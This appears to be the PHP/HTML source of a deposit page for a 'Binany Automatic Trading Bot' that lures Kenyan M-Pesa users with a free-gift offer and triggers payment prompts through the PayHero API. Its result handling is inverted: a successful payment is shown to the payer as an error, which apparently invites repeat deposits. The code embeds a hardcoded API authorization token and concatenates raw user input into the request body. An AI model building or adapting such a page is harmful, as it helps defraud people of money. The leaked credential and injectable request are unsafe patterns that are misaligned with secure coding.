<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
    <title>BINANY AUTOMATIC TRADING BOT - DEPOSIT</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
    <script type="text/javascript" src="https://www.jquery-az.com/javascript/alert/dist/sweetalert-dev.js"></script>
    <link rel="stylesheet" type="text/css" href="https://www.jquery-az.com/javascript/alert/dist/sweetalert.css">
  </head>
  <body>
    <style>
      body {
        background: blueviolet;
        align-items: center;
        justify-content: center;
        height: 80vh;
        width: 90w;
      }

      .container {
        margin-top: 25%;
        height: 300px;
      }

      @media only screen and (min-width: 700px) {
        .container {
          width: 700px;
          height: 300px;
        }

        .row {
          width: 120%;
        }
      }

      @media only screen and (min-width: 1024px) {
        .container {
          margin-top: 5%;
        }
      }

      @media only screen and (min-width: 768px) and (max-width: 1023px) {
        .container {
          margin-top: 30%;
        }

        .row {
          margin-left: 50%;
          transform: scale(1.5);
        }
      }
    </style>
    <div class="container">
      <div class="row">
        <div class="col-xs-7 col-md-7">
          <div class="card">
            <div class="card-body">
              <form action="" role="form" method="POST">
                <div style="width:90%; margin-left: 5%; padding: 10px; background: #12c99b; color: #fff; font-weight: bold; border-radius: 2px;" class="notice">
                  <marquee>
                    <span> DEPOSIT FROM KSH1,000 TO GET A FREE GIFT OF KSH750 DIRECTLY TO YOUR ACCOUNT. ALL GIFTS SHOULD BE WITHDRAWN WITHIN A DAY BEFORE IT EXPIRES. ENJOY TRADING WITH: <span style="color: #000;">Binany Automatic trading bot 🤖</span>
                    </span>
                  </marquee>
                </div>
                <div>
                  <img src="https://cdn-images-1.medium.com/fit/t/1600/480/1*ku2fgiHHIfl_VOatvwwZGw.png" class="mx-auto d-block" width="100%" height="13%">
                </div>
                <div class="form-group">
                  <div class="alert alert-info">𝘿𝙀𝙋𝙊𝙎𝙄𝙏 𝙏𝙊 𝘽𝙄𝙉𝘼𝙉𝙔 𝙏𝙍𝘼𝘿𝙄𝙉𝙂 𝘾𝙊𝙈𝙋𝘼𝙉𝙔</div>
                  <label for="phoneNumber"> Phone </label>
                  <div class="input-group">
                    <input type="text" class="form-control" id="phone" name='phone' placeholder="start with 07 or 01 only safaricom" required autofocus />
                    <div class="input-group-prepend">
                      <span class="input-group-text">
                        <span class="fa fa-phone"></span>
                      </span>
                    </div>
                  </div>
                </div>
                <div class="form-group">
                  <label for="amount"> Amount</label>
                  <div class="input-group">
                    <input type="text" class="form-control" id="amount" name='amount' placeholder="eg. 500" required autofocus value="" />
                    <div class="input-group-prepend">
                      <span class="input-group-text">
                        <span class="fa fa-credit-card"></span>
                      </span>
                    </div>
                  </div>
                 </div>
                <br />
                <button type="submit" name="send-stk" id="send-stk" class="btn btn-success btn-block">
                  <strong>DEPOSIT</strong>
                </button>
              </form>
              <div id="response"></div>
            </div>
          </div>
        </div>
      </div> 

      <?php

if (isset($_POST['send-stk'])) {


 $amount = $_POST['amount'];
$phone_number = $_POST['phone'];
if (!isset($_SESSION['external_reference'])) {
    $_SESSION['external_reference'] = rand(10000, 99999);
}

// Access the reference in your callback URL file
$external_reference = $_SESSION['external_reference'];


    $curl = curl_init();
    curl_setopt_array($curl, array(
        CURLOPT_URL => 'https://backend.payhero.co.ke/api/v2/payments',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 0,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => 'POST',
        CURLOPT_POSTFIELDS => '{
            "amount": ' . $amount . ',
            "phone_number": "' . $phone_number . '",
            "channel_id": 308,
            "provider": "m-pesa",
            "external_reference": "' . $external_reference . '2",
            "callback_url": " "
        }',
        CURLOPT_HTTPHEADER => array(
            'Content-Type: application/json',
            'Authorization: Basic ZGxqMlZsbFZLeWJCZ2RIMnpxUkI6aExjUkhaTGhUVlVERGJtV29Td3Fsc1FRSU9tb1pORWQzR01wWEcybQ==' //ADD YOUR BASIC AUTH TOKEN AFTER THE "Basic" 
        ),
    ));

    $response = curl_exec($curl);
    curl_close($curl);

    $Status = json_decode($response)->status;

    if ($Status == "Success") {
        echo '
                    <script type="text/javascript">swal("Ooops!", "We encountered a problem while processing your payment. Try again later or contact your merchant.", "error");</script>';
    } else {
        echo '
                    <script type="text/javascript">swal("Success!", "Deposit request initiated successfully. Check your mobile phone for an MPESA STK push to complete your deposit into your bot account. Thank you for choosing BINANY TRADING COMPANY", "success");</script>';
    }



}    
?>
  </body>

  </html> 



  <strong>ARE YOU HAVING PROBLEM WITH DEPOSIT?</strong> 


<?php
// Direct email contact
echo '<a href="mailto:binany@socialworker.net" class="btn btn-info btn-block"><strong>Email Support</strong></a>';
?>

      <em>Or WhatsApp By clicking;</em>
      <a href="https://wa.me/17727668839" class="btn btn-info btn-block" target="_blank">
      <strong>Message Us on WhatsApp</strong>
    </a>



    </body>   BINANY TRADING COMPANY</body>

<em>all right reserved @2001-2024|BY GK</em>
</html>

    <div id='chat-box'>
<div id='chat-msg'>Do you have problem with deposit or anything else?</p>
<div id='chat-form'>
<div class='chat-in'>
<input type='text' id='whats-in' Placeholder='Send Your Message...'/></div><div id='send-btn'><svg xmlns="http://www.w3.org/2000/svg" width="38" height="38" viewBox="0 0 48 48"><path d="M4.02 42L46 24 4.02 6 4 20l30 4-30 4z" fill='rgb(18, 140, 126)'/></svg></div></div>
</div>
</div>
<div id='whats-chat'>

<svg xmlns="http://www.w3.org/2000/svg" version="1" width="35" height="35" viewBox="0 0 90 90"><path d="M90 44a44 44 0 0 1-66 38L0 90l8-24A44 44 0 0 1 46 0c24 0 44 20 44 44zM46 7C25 7 9 24 9 44c0 8 2 15 7 21l-5 14 14-4a37 37 0 0 0 58-31C83 24 66 7 46 7zm22 47l-2-1-7-4-3 1-3 4h-3c-1 0-4-1-8-5-3-3-6-6-6-8v-2l2-2 1-1v-2l-4-8c0-2-1-2-2-2h-2l-3 1c-1 1-4 4-4 9s4 11 5 11c0 1 7 12 18 16 11 5 11 3 13 3s7-2 7-5l1-5z" fill="#FFF"/></svg>
</div>
<style>
  body{width:100%}
*{margin:0px;padding:0px;box-sizing:border-box;}
#whats-chat{position:fixed;right:3%;bottom:10%;height:auto;width:auto;background:#25D366;padding:12.5px;border-radius:50px;}
#whats-chat:hover{cursor:pointer;box-shadow:2px 2px 15px #ccc;bottom:11%;}
/*===============================*/
#chat-box{position:fixed;right:-500px;bottom:18%;width:250px;height:200px;transition:all .5s;}
#chat-top{width:100%;line-height:2;background:rgb(18, 140, 126);color:white;text-align:center;border-radius:5px 5px 0 0;padding:0 10px;}
#chat-msg{background:#ece5dd;padding:10px;border-radius:0 0 5px 5px;box-shadow:0 0 25px -10px #999;}
#chat-msg p{font-size:14px;padding:5px;background:white;border-radius:0 50px 50px 50px;margin-bottom:10px;}
#chat-form{display:flex;}
.chat-in{width:80%;}
#chat-form input{border-radius:5px 0 5px 5px;border:none;outline:none;font-size:14px;padding:5px;line-height:2;}
#send-btn{width:20%;padding: 0 5px;}
#chat-top-right{float:right;padding:5px 0;}
#chat-box:after{content:'';
    position: absolute;
    top:58%;
    left: 90%;
    width: 0;
    height: 0;
    border-top: 25px solid transparent;
  border-bottom: 25px solid transparent; 
  
  border-right:25px solid #ece5dd;}
.right{float:right}
.clear{clear:both}
</style>
<script>
document.getElementById('whats-chat').addEventListener("mouseover", showchatbox);
document.getElementById('chat-top-right').addEventListener("click", closechatbox);
document.getElementById('send-btn').addEventListener("click", sendmsg);
window.addEventListener("load", showchatboxtime);
function showchatbox(){
document.getElementById('chat-box').style.right='8%'
}
function closechatbox(){
document.getElementById('chat-box').style.right='-500px'


}
function showchatboxtime(){
setTimeout(launchbox,5000)
}
function launchbox(){
document.getElementById('chat-box').style.right='8%'

}
function sendmsg(){
var msg = document.getElementById('whats-in').value;
var relmsg = msg.replace(/ /g,"%20");
 window.open('https://api.whatsapp.com/send?phone=254701339573&text='+relmsg,'_blank');

}
</script>
